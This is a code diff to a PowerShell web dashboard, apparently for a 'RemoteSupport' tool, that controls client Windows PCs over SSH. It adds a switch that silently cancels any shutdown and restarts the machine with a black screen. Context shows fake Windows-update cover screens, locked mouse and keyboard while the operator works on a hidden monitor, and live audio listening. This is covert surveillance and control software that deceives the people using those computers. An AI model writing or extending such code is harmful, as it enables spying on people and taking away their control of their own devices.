@@ -287,6 +287,30 @@ function Get-WorkCover($ip) {
     return $m
 }
 
+# Per-client switch for the fully-automatic "silent restart on any shutdown" watcher
+# (shutdownwatch.ps1, deployed to every client by update.ps1, but does nothing unless this
+# flag says on). Default is OFF on every client - it only runs where you've turned it on here.
+function Set-AutoSilent($ip, $mode) {
+    $mode = if (($mode -replace '[^a-zA-Z]','').ToLower() -eq 'on') { 'on' } else { 'off' }
+    $ps = @"
+`$f='C:\ProgramData\RemoteSupport\config.txt'
+`$d=Split-Path `$f; if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null}
+`$k=@(); if(Test-Path `$f){`$k=@(Get-Content `$f | Where-Object {`$_ -notmatch '^AUTOSILENT=' -and `$_.Trim() -ne ''})}
+`$k+='AUTOSILENT=$mode'
+Set-Content -Path `$f -Value `$k -Encoding ascii
+"@
+    # Fire-and-forget: instant, dashboard never blocks.
+    SSH-Fire $ip ('powershell -NoProfile -EncodedCommand ' + (Enc $ps))
+    $script:autoSilent[$ip] = $mode
+    return $mode
+}
+function Get-AutoSilentCached($ip) {
+    # Served from the dashboard's own tracked state - no SSH, instant, matches Get-WorkCover's
+    # already-fixed pattern so this can never freeze the UI either.
+    if ($script:autoSilent.ContainsKey($ip)) { return $script:autoSilent[$ip] }
+    return 'off'
+}
+
 # Push the friendly-name map (HOSTNAME=name) to every online client, so the
 # Telegram online/offline alerts show your dashboard names instead of raw hostnames.
 function Push-Names {
@@ -682,6 +706,7 @@ function Blocked-All {
 
 $script:lockedClients = @{}
 $script:workCover = @{}
+$script:autoSilent = @{}
 # Live-audio listen: tracks the one active audio stream (ssh -L forward process + local
 # player process). Only one client is listened to at a time.
 $script:audio = $null
@@ -1128,9 +1153,19 @@ function panel(){
      <button class="act" onclick="appMgr()">Block apps</button>
      ${btn('restart','Restart','danger')}
      ${btn('shutdown','Shutdown','danger')}
-     <button class="act" onclick="stopRestart()" title="If the client is shutting down: cancel it, show the blue Windows-update screen, then auto-restart in 5 min">Stop shutdown &rarr; update screen + restart 5 min</button>
+     <button class="act" onclick="stopRestart()" title="If the client is shutting down right now: cancel it and restart instantly and silently (black screen, no dialog, no wait)">Stop shutdown &rarr; silent instant restart</button>
    </div>
    <div id="out">Ready.</div>
+   <div class="lockbox" style="border-color:#3a6b46">
+     <h3>Auto silent restart (this client only)</h3>
+     <div style="font-size:11px;color:#7d8aa5;margin:-6px 0 12px">When ON: the instant ANY shutdown/restart starts on this PC - the client, Windows Update, anyone - it automatically goes black-screen silent and restarts right away, with no button click needed. OFF by default on every client; turn ON only for the ones you want this on.</div>
+     <div style="display:flex;gap:14px;flex-wrap:wrap;align-items:center">
+       <button type="button" id="asOn" onclick="autoSilent('on')" style="padding:8px 18px;border-radius:7px;border:1px solid #2a7a4a;background:#0e5c32;color:#fff;font-size:12.5px;cursor:pointer">ON</button>
+       <button type="button" id="asOff" onclick="autoSilent('off')" style="padding:8px 18px;border-radius:7px;border:1px solid #7a3a42;background:#3a2226;color:#e0868f;font-size:12.5px;cursor:pointer">OFF</button>
+       <span id="asBadge" style="margin-left:4px;font-size:12px;padding:5px 12px;border-radius:20px;background:#2b3550;color:#9fb0d0">Off</span>
+     </div>
+     <div class="hint">Needs this client on the latest update (Upgrade all) to have the watcher installed at all.</div>
+   </div>
    <div class="lockbox" style="border-color:#3a4a72">
      <h3>Work behind cover (you work while client sees a cover)</h3>
      <div style="font-size:11px;color:#7d8aa5;margin:-6px 0 12px">Adds a hidden 2nd screen. Client's real screen shows black/update + their mouse/keyboard locked; you connect with RustDesk/AnyDesk, switch to monitor 2, and work normally.</div>
@@ -1142,6 +1177,7 @@ function panel(){
      <div class="hint">Turning OFF also removes the 2nd screen. Backup on the client: Ctrl+Alt+U. Closing this dashboard turns every cover off.</div>
    </div>`;
   checkWork();
+  checkAutoSilent();
 }
 function btn(a,label,cls){return `<button class="act ${cls}" onclick="act('${a}')">${label}</button>`;}
 async function act(a){
@@ -1177,7 +1213,7 @@ async function pollLevel(){
 function stopRestart(){
   if(!sel)return;
   const o=document.getElementById('out');
-  if(o)o.textContent='Fired to '+sel.name+': shutdown cancelled, blue update screen showing, auto-restart in ~5 min.';
+  if(o)o.textContent='Fired to '+sel.name+': shutdown cancelled, screen going black silently, restarting now.';
   fetch('/api/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,action:'stoprestart'})}).catch(()=>{});
 }
 async function checkLock(){
@@ -1412,6 +1448,28 @@ async function checkWork(){
   if(!sel||!document.getElementById('wcBadge'))return;
   try{const r=await fetch('/api/workcoverget?ip='+sel.ip);paintWork((await r.json()).active||'off');}catch(e){}
 }
+let asMode='off';
+function paintAutoSilent(active){
+  asMode=active;
+  const on=document.getElementById('asOn'),bad=document.getElementById('asBadge');
+  if(!on||!bad)return;
+  on.style.outline=(active==='on')?'2px solid #7fe0a0':'none';
+  if(active==='on'){bad.textContent='ON - auto silent restart active';bad.style.background='#123a22';bad.style.color='#5fe08a';}
+  else{bad.textContent='Off';bad.style.background='#2b3550';bad.style.color='#9fb0d0';}
+}
+async function autoSilent(mode){
+  if(!sel)return;
+  const msg = mode==='on' ? ('Turning ON auto silent restart for '+sel.name+'...') : ('Turning OFF auto silent restart for '+sel.name+'...');
+  showProg(0,1,msg); paintAutoSilent(mode);
+  try{const r=await fetch('/api/autosilent',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:sel.ip,mode})});
+  const j=await r.json();paintAutoSilent(j.active||'off');
+  updProg(1,1, mode==='on' ? 'ON - this client will now auto-silent-restart on any shutdown.' : 'OFF - back to manual (button/Action1) only.');
+  setTimeout(hideProg,2500);}catch(e){hideProg();}
+}
+async function checkAutoSilent(){
+  if(!sel||!document.getElementById('asBadge'))return;
+  try{const r=await fetch('/api/autosilentget?ip='+sel.ip);paintAutoSilent((await r.json()).active||'off');}catch(e){}
+}
 let deadHits=0;
 async function ping(){
   try{await fetch('/api/heartbeat',{cache:'no-store'});deadHits=0;}
@@ -1568,6 +1626,17 @@ Set-Content -Path 'C:\ProgramData\RemoteSupport\LOCK.flag' -Value '' -Encoding a
             $ip = $ctx.Request.QueryString['ip']
             $a = if ($script:workCover.ContainsKey($ip)) { $script:workCover[$ip] } else { 'off' }
             Send $ctx (@{ active = $a } | ConvertTo-Json -Compress) 'application/json'
+        }
+        elseif ($path -eq '/api/autosilent') {
+            # body: {ip, mode:'on'|'off'} - per-client switch for the automatic
+            # silent-restart-on-any-shutdown watcher. Off by default on every client.
+            $b = Body $ctx
+            $a = Set-AutoSilent $b.ip $b.mode
+            Send $ctx (@{ active = $a } | ConvertTo-Json -Compress) 'application/json'
+        }
+        elseif ($path -eq '/api/autosilentget') {
+            $ip = $ctx.Request.QueryString['ip']
+            Send $ctx (@{ active = (Get-AutoSilentCached $ip) } | ConvertTo-Json -Compress) 'application/json'
         }
         elseif ($path -eq '/api/audiolevel') {
             $lv = 0.0
